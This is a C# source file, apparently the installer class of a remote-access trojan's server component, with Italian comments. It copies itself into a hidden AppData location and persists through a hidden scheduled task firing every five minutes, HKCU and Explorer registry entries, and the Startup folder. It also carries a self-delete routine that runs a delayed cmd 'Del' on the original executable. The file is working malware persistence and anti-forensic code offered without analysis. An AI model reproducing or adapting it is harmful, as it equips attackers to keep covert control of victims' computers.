using System;
using System.IO;
using System.Reflection;
using System.Threading;

namespace bc.srv.Classes
{


    internal class InstallClass
    {
        private static string _xml = "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n \n  <Triggers>\n    <CalendarTrigger>\n      <Repetition>\n        <Interval>PT5M</Interval>\n        <Duration>P1D</Duration>\n        <StopAtDurationEnd>false</StopAtDurationEnd>\n      </Repetition>\n      <StartBoundary>2021-01-01T23:04:28</StartBoundary>\n      <Enabled>true</Enabled>\n      <ScheduleByDay>\n        <DaysInterval>1</DaysInterval>\n      </ScheduleByDay>\n    </CalendarTrigger>\n  </Triggers>\n  \n  <Settings>\n    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\n    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\n    <AllowHardTerminate>true</AllowHardTerminate>\n    <StartWhenAvailable>true</StartWhenAvailable>\n    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n    <IdleSettings>\n      <StopOnIdleEnd>true</StopOnIdleEnd>\n      <RestartOnIdle>false</RestartOnIdle>\n    </IdleSettings>\n    <AllowStartOnDemand>true</AllowStartOnDemand>\n    <Enabled>true</Enabled>\n    <Hidden>true</Hidden>\n    <RunOnlyIfIdle>false</RunOnlyIfIdle>\n    <WakeToRun>false</WakeToRun>\n    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>\n    <Priority>7</Priority>\n  </Settings>\n  <Actions Context=\"Author\">\n    <Exec>\n      <Command>{{srvPath}}</Command>\n    </Exec>\n  </Actions>\n</Task>";
        /// <summary>
        ///     Avvia thread di installazione
        /// </summary>
        public void StartInstallThread()
        {
            var t = new Thread(this.InstallServer)
            {
                IsBackground = true
            };
            t.Start();
        }


        /// <summary>
        ///     Installo il server
        /// </summary>
        private void InstallServer()
        {
            
            if (SrvData.Instance.UseTaskScheduler)
                this.InstallTaskScheduler(SrvData.Instance.sAppDataInstall);
            
            if (SrvData.Instance.BUseHkcu)
                this.InstallHcku(SrvData.Instance.SHkcuEntry, SrvData.Instance.sAppDataInstall);
            
            if (SrvData.Instance.bUseExplorer)
                this.InstallExplorer(SrvData.Instance.sExplorerEntry, SrvData.Instance.sAppDataInstall);
            
            if (SrvData.Instance.bUseStartupFolder)
                this.CopyInStartup(SrvData.Instance.sStartupFileName);
        }

        private void InstallTaskScheduler(string appDataPath)
        {
            try
            {
                var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                var finalDestination = Path.Combine(appData, appDataPath);
            
                this.SaveFileIfNotExistsAndTryHidden(finalDestination);

                var creationXml = _xml.Replace("{{srvPath}}", finalDestination);
                var fileName = $"{Guid.NewGuid():N}.xml";
                var xmlDestination = Path.Combine(Path.GetDirectoryName(finalDestination), fileName);
                File.WriteAllText(xmlDestination,creationXml);
                var dosRunner = new DosRunner();
                dosRunner.ExecuteCommand($"schtasks.exe /Create /XML {fileName} /tn {SrvData.Instance.TaskSchedulerName}", Path.GetDirectoryName(finalDestination));
                File.Delete(xmlDestination);
            }
            catch (Exception e)
            {
                Console.WriteLine(e);
                throw;
            }
          
        }
        //-----------------------------------------

        /// <summary>
        ///     Installo su registro HCKU
        /// </summary>
        /// <param name="regEntry"></param>
        /// <param name="appDataPath"></param>
        private void InstallHcku(string regEntry, string appDataPath)
        {
            try
            {
                var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

                var finalDestination = Path.Combine(appData, appDataPath);

                var rm = new RegistryManager();
                
                rm.AddHkcuReg(regEntry, finalDestination);

                this.SaveFileIfNotExistsAndTryHidden(finalDestination);

            }
            catch (Exception ex)
            {
                var errror = ex.Message;
            }
        }
        //------------------------------------------


        /// <summary>
        ///     Installo su registro EXPLORER
        /// </summary>
        /// <param name="regEntry"></param>
        /// <param name="appDataPath"></param>
        private void InstallExplorer(string regEntry, string appDataPath)
        {
            try
            {
                var appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

                var finalDestination = Path.Combine(appData, appDataPath);

                var rm = new RegistryManager();

                rm.AddExplorerReg(regEntry, finalDestination);


               this.SaveFileIfNotExistsAndTryHidden(finalDestination);
            }
            catch
            {
            }
        }
        //------------------------------------------


        /// <summary>
        ///     Copio il server nella cartella startup con un nome FILE PASSATO
        /// </summary>
        /// <param name="filename"></param>
        private void CopyInStartup(string filename)
        {
            var path = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
            var mynameEntire = Assembly.GetExecutingAssembly().Location;


            var finalDest = Path.Combine(path, filename);

            try
            {
                // SE NON ESISTE MI CREO IL FILE ALTRIMENTI L'HO GIà CREATO!
                if (!File.Exists(finalDest))
                    File.Copy(mynameEntire, finalDest);
            }
            catch
            {
            }
        }
        //-------------------------------------------------


        
        private void SaveFileIfNotExistsAndTryHidden(string finalDestination)
        {
            if (File.Exists(finalDestination)) return;
            
            Directory.CreateDirectory(Path.GetDirectoryName(finalDestination));
            File.Copy(Assembly.GetExecutingAssembly().Location, finalDestination);

            try
            {
                File.SetAttributes(finalDestination,FileAttributes.Hidden);
            }
            catch 
            {
            }
        }
        
        /// <summary>
        ///     Crea Processo CMD per l'eliminazione del file in esecuzione dopo 10 SEC
        ///     DOPO CHIUDE L'APPLICAZIONE!!!!!!!!!
        /// </summary>
        public void DeleteMySelf()
        {
            var arg = $"/C choice /C Y /N /D Y /T 9 & Del \"{Assembly.GetExecutingAssembly().Location}\"";

            var dr = new DosRunner();

            dr.RunDosSelfDelete(arg);

            Program.Exit(3);
        }
        //-----------------------------------------------
    }
}